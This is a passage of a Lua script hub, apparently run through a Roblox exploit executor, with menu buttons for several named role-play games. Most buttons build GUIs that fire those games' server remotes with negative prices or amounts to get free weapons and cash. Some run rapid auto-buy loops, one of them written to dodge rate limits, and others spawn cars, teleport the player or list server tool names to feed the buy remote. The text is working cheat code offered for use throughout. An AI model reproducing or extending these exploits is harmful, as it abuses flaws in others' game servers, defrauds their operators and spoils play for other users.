            ReplicatedStorage.GivePistolBox:FireServer(selectedItem, -100000)
            print("Auto-buying " .. selectedItem)
        end
        task.wait(0.001)
    end
end)

-- RightShift toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

addMainMenuButton("URBAN CITY V3 [3KTG]", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 200) -- Adjusted to fit just 2 items
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "URBAN CITY V3"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy
local items = {
    {"Pistol", "Pistol"},
    {"Deagle", "Deagle"}
}

local selectedItem = nil

-- Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdown.TextColor3 = Color3.new(1, 1, 1)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

-- Dropdown frame (auto height)
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #items * 30)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Buttons for dropdown
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 30)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 30)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]
        dropdown.Text = item[1]
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 85 + (#items * 30) + 10)
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggle.TextColor3 = Color3.new(1, 1, 1)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

local isAutoBuying = false

toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"

    while isAutoBuying do
        if selectedItem then
            ReplicatedStorage.GunStoreFolder.BuyTool:FireServer(selectedItem, -0)
            print("Auto-buying " .. selectedItem)
        end
        task.wait(5)
    end
end)

-- Toggle GUI visibility with RightShift
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TBC SPAWN GUN [3KTG]", function()
	local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

--// Main Frame (sakto lang)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 350, 0, 300) -- sakto lang, hindi sobrang laki
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "THE BILLIONARE CITY RP"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 10)

--// Item List
local items = {
    {"Normal Pistol", "Normal Pistol"},
    {".50 Silence", ".50 Silence"},
    {"Calisto Pistol", "Calisto Pistol"},
    {"Combat Pistol", "Combat Pistol"},
    {"Combo 3", "Combo 3"},
    {"LockPick", "LockPick"},
    {"Normal Rod", "Normal Rod"},
    {"Rock", "Rock"},
    {"PistolBody", "PistolBody"},
    {"SharkFang", "SharkFang"},
    {"SharkBone", "SharkBone"},
    {"Stick", "Stick"},
    {"Stone", "Stone"},
    {"Oxy armor", "Oxy armor"},
    {"SwitchBlade", "SwitchBlade"}
}

local selectedItem = nil

--// Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 35)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
dropdown.TextColor3 = Color3.new(1, 1, 1)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 16
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 8)

--// Scrollable Dropdown Frame
local dropdownFrame = Instance.new("ScrollingFrame")
dropdownFrame.Size = UDim2.new(1, -20, 0, 120) -- mas maliit, sakto lang
dropdownFrame.Position = UDim2.new(0, 10, 0, 90)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
dropdownFrame.BorderSizePixel = 0
dropdownFrame.ScrollBarThickness = 6
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 8)

--// Add Buttons inside dropdown
dropdownFrame.CanvasSize = UDim2.new(0, 0, 0, #items * 32)
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 30)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 32)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 14
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]
        dropdown.Text = "Selected: " .. item[1]
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

--// Auto Buy Button (medyo baba na)
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 40)
toggle.Position = UDim2.new(0, 10, 1, -30) -- medyo baba pero hindi sobra
toggle.AnchorPoint = Vector2.new(0, 1)
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
toggle.TextColor3 = Color3.new(1, 1, 1)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 16
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 8)

--// Logic
local isAutoBuying = false

toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"

    while isAutoBuying do
        if selectedItem then
            ReplicatedStorage.BuyToolEvent:FireServer(selectedItem, 1)
            print("Auto-buying " .. selectedItem)
        end
        task.wait(1)
    end
end)

--// Toggle GUI visibility with RightShift
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TBC CASH SPAWN [3KTG]", function()
		-- Updated: Draggable GUI + Auto-Fire every 0.1s when ON
-- LocalScript in StarterPlayerScripts

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false

-- Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 220, 0, 120)
frame.Position = UDim2.new(0.5, -110, 0.5, -60)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = frame

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 8)
title.BackgroundTransparency = 1
title.Text = "MONEY"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = frame

-- Money Label
local moneyLabel = Instance.new("TextLabel")
moneyLabel.Size = UDim2.new(1, -20, 0, 25)
moneyLabel.Position = UDim2.new(0, 10, 0, 38)
moneyLabel.BackgroundTransparency = 1
moneyLabel.Text = "$0"
moneyLabel.TextColor3 = Color3.new(0, 1, 0)
moneyLabel.Font = Enum.Font.Gotham
moneyLabel.TextSize = 20
moneyLabel.TextXAlignment = Enum.TextXAlignment.Left
moneyLabel.Parent = frame

-- Cash Button
local cashButton = Instance.new("TextButton")
cashButton.Size = UDim2.new(0, 80, 0, 30)
cashButton.Position = UDim2.new(1, -90, 1, -38)
cashButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
cashButton.Text = "CASH"
cashButton.TextColor3 = Color3.new(1, 1, 1)
cashButton.Font = Enum.Font.GothamBold
cashButton.TextSize = 14
cashButton.Parent = frame

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 8)
btnCorner.Parent = cashButton

-- Toggle Switch
local toggleFrame = Instance.new("Frame")
toggleFrame.Size = UDim2.new(0, 40, 0, 20)
toggleFrame.Position = UDim2.new(0, 10, 1, -30)
toggleFrame.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
toggleFrame.Parent = frame

local toggleCorner = Instance.new("UICorner")
toggleCorner.CornerRadius = UDim.new(0, 10)
toggleCorner.Parent = toggleFrame

local toggleButton = Instance.new("Frame")
toggleButton.Size = UDim2.new(0, 16, 0, 16)
toggleButton.Position = UDim2.new(0, 2, 0.5, -8)
toggleButton.BackgroundColor3 = Color3.new(1, 1, 1)
toggleButton.Parent = toggleFrame

local toggleBtnCorner = Instance.new("UICorner")
toggleBtnCorner.CornerRadius = UDim.new(0, 8)
toggleBtnCorner.Parent = toggleButton

-- Draggable Functionality
local dragging = false
local dragInput, dragStart, startPos

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position
		
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

RunService.RenderStepped:Connect(function()
	if dragging and dragInput then
		local delta = dragInput.Position - dragStart
		frame.Position = UDim2.new(
			startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y
		)
	end
end)

-- Toggle State
local isOn = false
local connection

toggleFrame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		isOn = not isOn
		if isOn then
			toggleButton.Position = UDim2.new(1, -18, 0.5, -8)
			toggleButton.BackgroundColor3 = Color3.new(0, 1, 0)
			toggleFrame.BackgroundColor3 = Color3.new(0.1, 0.4, 0.1)
			
			-- Auto-fire every 0.1 seconds
			connection = RunService.Heartbeat:Connect(function()
				if ReplicatedStorage:FindFirstChild("GiveAyuda") then
					ReplicatedStorage.GiveAyuda:FireServer("Combat Pistol", -1)
				end
			end)
			-- Delay first fire slightly to avoid rate limit
			task.wait(0.1)
		else
			toggleButton.Position = UDim2.new(0, 2, 0.5, -8)
			toggleButton.BackgroundColor3 = Color3.new(1, 1, 1)
			toggleFrame.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
			
			if connection then
				connection:Disconnect()
				connection = nil
			end
		end
	end
end)

-- Manual CASH button (optional, still works)
cashButton.MouseButton1Click:Connect(function()
	if ReplicatedStorage:FindFirstChild("GiveAyuda") then
		ReplicatedStorage.GiveAyuda:FireServer("Combat Pistol", -1)
	end
end)

-- Update money display
spawn(function()
	if player:FindFirstChild("leaderstats") then
		local cash = player.leaderstats:FindFirstChild("Cash") or player.leaderstats:FindFirstChild("Money")
		if cash then
			cash.Changed:Connect(function()
				moneyLabel.Text = "$"..tostring(cash.Value)
			end)
			moneyLabel.Text = "$"..tostring(cash.Value)
		end
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TBC REFRESH [3KTG]", function()
	--// GUI Setup
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local UIStroke = Instance.new("UIStroke")
local Title = Instance.new("TextLabel")
local SpawnButton = Instance.new("TextButton")
local TPButton = Instance.new("TextButton")
local RefreshButton = Instance.new("TextButton")
local Drag = Instance.new("UIDragDetector")

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
Frame.Position = UDim2.new(0.4, 0, 0.4, 0)
Frame.Size = UDim2.new(0, 200, 0, 180)

UIStroke.Parent = Frame
UIStroke.Color = Color3.fromRGB(0,0,0)
UIStroke.Thickness = 2

UICorner.Parent = Frame
Drag.Parent = Frame

--// Title
Title.Parent = Frame
Title.BackgroundTransparency = 1
Title.Text = "MONSY"
Title.Size = UDim2.new(1,0,0,25)
Title.Position = UDim2.new(0,0,0,0)
Title.TextColor3 = Color3.fromRGB(255,255,255)
Title.TextSize = 16
Title.Font = Enum.Font.GothamBold

--// Button styling function
local function MakeButton(btn, text, posY)
    btn.Parent = Frame
    btn.BackgroundColor3 = Color3.fromRGB(0,0,0)
    btn.TextColor3 = Color3.fromRGB(255,255,255)
    btn.Text = text
    btn.Size = UDim2.new(0,180,0,35)
    btn.Position = UDim2.new(0,10,0,posY)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 14 -- <<<<< MAS MALIIT NA TEXT
    Instance.new("UICorner", btn)
end

MakeButton(SpawnButton, "SPAWN CAR", 30)
MakeButton(TPButton, "TELEPORT", 75)
MakeButton(RefreshButton, "REFRESH", 120)

--// SPAWN CAR FUNCTION
SpawnButton.MouseButton1Click:Connect(function()
    local args = {}
    game:GetService("ReplicatedStorage"):WaitForChild("SpawnCarEvent", 9e9):FireServer(unpack(args))
end)

--// TELEPORT FUNCTION
local targetPosition = Vector3.new(-10.015, 5.02, 788.2)

TPButton.MouseButton1Click:Connect(function()
    local character = game.Players.LocalPlayer.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
        print("Teleported!")
    else
        warn("HumanoidRootPart missing!")
    end
end)

--// REFRESH FUNCTION
RefreshButton.MouseButton1Click:Connect(function()
    local args = {
        [1] = "Male";
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Morph", 9e9):FireServer(unpack(args))
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TBC SPAWN TOOLS [3KTG]", function()
	-- LocalScript: TAONG GOMA ‚Äî Buy Tool System (All Black + Rounded + BuyToolEvent)
-- Place in StarterPlayerScripts

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Remote: BuyToolEvent
local buyRemote = ReplicatedStorage:WaitForChild("BuyToolEvent")

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "CashMenuGUI"
gui.ResetOnSpawn = false
gui.Parent = playerGui

-- Frame (Pure Black + Rounded)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local frameCorner = Instance.new("UICorner", frame)
frameCorner.CornerRadius = UDim.new(0, 12)

-- Title
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "TAONG GOMA"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.TextXAlignment = Enum.TextXAlignment.Center
title.TextYAlignment = Enum.TextYAlignment.Center

-- Item Name TextBox
local itemBox = Instance.new("TextBox", frame)
itemBox.Size = UDim2.new(1, -20, 0, 35)
itemBox.Position = UDim2.new(0, 10, 0, 55)
itemBox.PlaceholderText = "Enter Tool Name"
itemBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
itemBox.BackgroundColor3 = Color3.new(0, 0, 0)
itemBox.TextColor3 = Color3.new(1, 1, 1)
itemBox.Font = Enum.Font.Gotham
itemBox.TextSize = 14
itemBox.ClearTextOnFocus = true

local itemCorner = Instance.new("UICorner", itemBox)
itemCorner.CornerRadius = UDim.new(0, 6)

-- Amount TextBox
local amountBox = Instance.new("TextBox", frame)
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 100)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.new(0, 0, 0)
amountBox.TextColor3 = Color3.new(1, 1, 1)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 14
amountBox.ClearTextOnFocus = true

local amountCorner = Instance.new("UICorner", amountBox)
amountCorner.CornerRadius = UDim.new(0, 6)

-- Buy Button
local sendButton = Instance.new("TextButton", frame)
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 145)
sendButton.Text = "BUY"
sendButton.BackgroundColor3 = Color3.new(0, 0, 0)
sendButton.TextColor3 = Color3.new(1, 1, 1)
sendButton.Font = Enum.Font.GothamBold
sendButton.TextSize = 16

local buttonCorner = Instance.new("UICorner", sendButton)
buttonCorner.CornerRadius = UDim.new(0, 6)

-- Feedback Label
local feedback = Instance.new("TextLabel", frame)
feedback.Size = UDim2.new(1, -20, 0, 20)
feedback.Position = UDim2.new(0, 10, 1, -22)
feedback.BackgroundTransparency = 1
feedback.Font = Enum.Font.Gotham
feedback.TextSize = 12
feedback.TextColor3 = Color3.fromRGB(180, 180, 180)
feedback.Text = ""

-- Show feedback with auto-clear
local function showFeedback(msg, duration)
    feedback.Text = msg
    task.delay(duration or 2, function()
        if feedback and feedback.Parent then
            feedback.Text = ""
        end
    end)
end

-- Buy Logic using BuyToolEvent
local function buyItem()
    local item = itemBox.Text
    local amount = tonumber(amountBox.Text)

    if item == "" or not amount or amount < 1 then
        showFeedback("Invalid input!", 2)
        return
    end

    -- Fire the remote: BuyToolEvent:FireServer("ToolName", amount)
    buyRemote:FireServer(item, amount)
    showFeedback("Buying: " .. item .. " x" .. amount, 2)
end

-- Connect events
sendButton.MouseButton1Click:Connect(buyItem)
itemBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then buyItem() end
end)
amountBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then buyItem() end
end)

-- Hover effect
sendButton.MouseEnter:Connect(function()
    sendButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
end)
sendButton.MouseLeave:Connect(function()
    sendButton.BackgroundColor3 = Color3.new(0, 0, 0)
end)

print("TAONG GOMA Buy System ‚Äî Using BuyToolEvent")
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TBC STORAGE VIEWER [3KTG]", function()
	-- LocalScript: Tools Viewer (All Black + Rounded + White Text + Pure Black Accents)
-- Place in StarterPlayerScripts

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Root: ReplicatedStorage.Tools
local toolsFolder = ReplicatedStorage:WaitForChild("Tools")

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "StorageSystemToolsViewer"
gui.ResetOnSpawn = false
gui.Parent = playerGui

-- Main Frame (Pure Black + Rounded)
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 380, 0, 340)
frame.Position = UDim2.new(0.5, -190, 0.25, 0)
frame.AnchorPoint = Vector2.new(0.5, 0)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true

local frameCorner = Instance.new("UICorner", frame)
frameCorner.CornerRadius = UDim.new(0, 12)

-- Title
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 36)
title.BackgroundTransparency = 1
title.Text = "Tools Viewer"
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.TextColor3 = Color3.new(1, 1, 1)

-- Subtitle
local subtitle = Instance.new("TextLabel", frame)
subtitle.Size = UDim2.new(1, -12, 0, 20)
subtitle.Position = UDim2.new(0, 6, 0, 38)
subtitle.BackgroundTransparency = 1
subtitle.Text = "Click tool to copy name"
subtitle.Font = Enum.Font.Gotham
subtitle.TextSize = 13
subtitle.TextColor3 = Color3.fromRGB(120, 120, 120)  -- Light gray ‚Üí darker for contrast
subtitle.TextXAlignment = Enum.TextXAlignment.Left

-- Scrolling Frame (Pure Black + Rounded)
local scrolling = Instance.new("ScrollingFrame", frame)
scrolling.Size = UDim2.new(1, -12, 1, -70)
scrolling.Position = UDim2.new(0, 6, 0, 64)
scrolling.BackgroundColor3 = Color3.new(0, 0, 0)
scrolling.BorderSizePixel = 0
scrolling.ScrollBarThickness = 6
scrolling.ScrollBarImageColor3 = Color3.fromRGB(40, 40, 40)  -- Darker scrollbar

local scrollCorner = Instance.new("UICorner", scrolling)
scrollCorner.CornerRadius = UDim.new(0, 8)

local layout = Instance.new("UIListLayout", scrolling)
layout.SortOrder = Enum.SortOrder.Name
layout.Padding = UDim.new(0, 3)

-- Clear list
local function clearList()
    for _, child in scrolling:GetChildren() do
        if child:IsA("TextButton") then
            child:Destroy()
        end
    end
end

-- Add clickable tool button (rounded + white text)
local function addTool(tool)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -10, 0, 28)
    btn.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
    btn.BorderSizePixel = 0
    btn.TextXAlignment = Enum.TextXAlignment.Left
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 14
    btn.TextColor3 = Color3.new(1, 1, 1)  -- Pure white text
    btn.BackgroundTransparency = 0

    local btnCorner = Instance.new("UICorner", btn)
    btnCorner.CornerRadius = UDim.new(0, 6)

    local relativePath = tool:GetFullName():match("^.-%.Tools%.(.+)$") or tool.Name
    btn.Text = "   " .. relativePath

    -- Click: Copy TOOL NAME ONLY
    btn.MouseButton1Click:Connect(function()
        setclipboard(tool.Name)
        btn.TextColor3 = Color3.fromRGB(150, 255, 150)  -- Light green flash
        btn.Text = "   " .. relativePath .. " [Copied!]"
        task.wait(1.2)
        btn.TextColor3 = Color3.new(1, 1, 1)
        btn.Text = "   " .. relativePath
    end)

    -- Hover
    btn.MouseEnter:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    end)
    btn.MouseLeave:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
    end)

    btn.Parent = scrolling
end

-- Rebuild list
local function rebuildList()
    clearList()
    local toolList = {}
    for _, obj in toolsFolder:GetDescendants() do
        if obj:IsA("Tool") then
            table.insert(toolList, obj)
        end
    end
    table.sort(toolList, function(a, b)
        return a.Name:lower() < b.Name:lower()
    end)
    for _, tool in toolList do
        addTool(tool)
    end
    scrolling.CanvasSize = UDim2.new(0, 0, 0, #toolList * 31 + 10)
end

-- Initial build
rebuildList()

-- Live Updates
local connections = {}
local function connect(signal, callback)
    local conn = signal:Connect(callback)
    table.insert(connections, conn)
end

connect(toolsFolder.DescendantAdded, function(desc)
    if desc:IsA("Tool") then
        task.wait()
        rebuildList()
    end
end)

connect(toolsFolder.DescendantRemoving, function(desc)
    if desc:IsA("Tool") then
        rebuildList()
    end
end)

-- Name/Parent change
local bindings = {}
local function bindTool(tool)
    local c1 = tool:GetPropertyChangedSignal("Name"):Connect(rebuildList)
    local c2 = tool:GetPropertyChangedSignal("Parent"):Connect(rebuildList)
    return function()
        c1:Disconnect()
        c2:Disconnect()
    end
end

local function updateBindings()
    for _, unbind in pairs(bindings) do unbind() end
    bindings = {}
    for _, obj in toolsFolder:GetDescendants() do
        if obj:IsA("Tool") then
            bindings[obj] = bindTool(obj)
        end
    end
end

connect(toolsFolder.DescendantAdded, function(desc)
    if desc:IsA("Tool") then updateBindings() end
end)
connect(toolsFolder.DescendantRemoving, function(desc)
    if desc:IsA("Tool") then updateBindings() end
end)
updateBindings()

-- Cleanup
player.AncestryChanged:Connect(function()
    if not player.Parent then
        for _, conn in connections do conn:Disconnect() end
        for _, unbind in pairs(bindings) do unbind() end
        gui:Destroy()
    end
end)	
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BAGONG BARYO SPAWNCAR [3KTG]", function()
	local player = game.Players.LocalPlayer
local rs = game:GetService("ReplicatedStorage")

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "CarSpawnGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 250, 0, 230)
frame.Position = UDim2.new(0.5, -125, 0.5, -115)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

-- Rounded Corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 15)
corner.Parent = frame

-- Title
local title = Instance.new("TextLabel")
title.Text = "Choose Your Vehicle"
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = frame

-- Button function (each with its own car name)
local function createButton(displayName, carName, posY)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.8, 0, 0, 35)
    btn.Position = UDim2.new(0.1, 0, 0, posY)
    btn.Text = displayName
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 16
    btn.Parent = frame

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 8)
    btnCorner.Parent = btn

    btn.MouseEnter:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    end)
    btn.MouseLeave:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    end)

    btn.MouseButton1Click:Connect(function()
        local args = {
            [1] = carName
        }

        rs:WaitForChild("Car Dealership System", 9e9)
            :WaitForChild("Events", 9e9)
            :WaitForChild("SpawnCarEvent", 9e9)
            :FireServer(unpack(args))
    end)
end

-- Create Buttons
createButton("Civic", "Civic", 50)
createButton("Subaru", "subaru", 90)
createButton("CarName", "CarName", 130)
createButton("Dirtbike", "Dirtbike", 170) 
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BAGONG BARYO REFRESH [3KTG]", function()
	local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "AutoRefreshGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame
local frame = Instance.new("Frame")
